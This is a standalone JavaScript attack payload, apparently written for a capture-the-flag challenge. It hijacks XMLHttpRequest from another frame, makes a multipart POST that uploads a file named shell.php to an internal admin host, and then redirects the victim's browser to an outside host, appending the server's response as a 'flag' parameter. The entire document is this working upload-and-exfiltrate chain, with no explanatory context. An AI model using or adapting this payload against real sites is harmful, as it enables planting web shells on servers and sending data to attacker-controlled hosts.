function post_data(){
	window.XMLHttpRequest = window.top.frames[1].XMLHttpRequest;
	var xhr = new XMLHttpRequest(); 
	xhr.open("POST","http://admin.government.vip:8000/upload", true);
	xhr.setRequestHeader('Content-Type','multipart/form-data; boundary=---------------------------11893108392116968444379574812');
	xhr.setRequestHeader('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
	var body = "-----------------------------11893108392116968444379574812\r\n" +
		"Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n" +
		"Content-Type: text/php\r\n" +
		"\r\n" +
		"<?php\r\n" +
		"echo phpinfo();\r\n" +
		"\r\n" +
		"?>\r\n" +
		"\r\n" +
		"-----------------------------11893108392116968444379574812--\r\n"	
	var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
	
	xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                location.href="http://ip/?flag="+escape(xhr.responseText);
            }
        }
        xhr.send(new Blob([aBody]));
}

post_data();
